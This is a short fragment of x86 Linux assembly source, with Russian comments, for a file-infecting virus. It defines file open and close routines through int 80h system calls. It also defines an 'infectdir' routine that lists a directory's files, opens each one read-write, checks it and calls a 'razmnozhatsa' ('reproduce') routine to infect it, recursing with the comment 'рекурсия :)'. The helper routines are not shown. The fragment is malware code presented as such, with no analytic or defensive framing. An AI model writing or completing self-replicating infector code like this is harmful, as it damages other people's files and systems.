;процедура открытия файла
;ebx - poiner to file name
;ecx -flags
;eax-result
openfl
mov eax,5
mov edx, 7777h
int 80h
ret
;==============================

;процедура закрытия файла
;ebx-fd
closefl
mov eax,6
int 80h
ret
;==============================

;======заражение файлов  в директории
infectdir
;===найти файл
push ebx
push ecx
mov eax,89
int 80h
;================
dec eax
jnz nomore; если нету - выйти

;=========открыть
lea ebx,[d_name]
mov ecx,2;O_RDWR
call openfl
null ebx
cmp eax,ebx
js nextinf
mov [fd],eax
;=================

;=====проверить
mov ebx,eax
call fcheck
test eax,eax

%ifdef DEBUGVER
jne provok
errors "ne pro6la proverka faila",_n_ext,errnoprov
jmp close1
%endif

je close1
;================

provok

;========заразить
mov [fsize],eax
call razmnozhatsa
;==================

;========закрыть
close1
mov ebx,[fd]
call closefl
;================

nextinf
pop ecx
pop ebx
call infectdir;рекурсия :)

jmp exitinfdir
nomore
add esp,8
exitinfdir
ret
;==========================================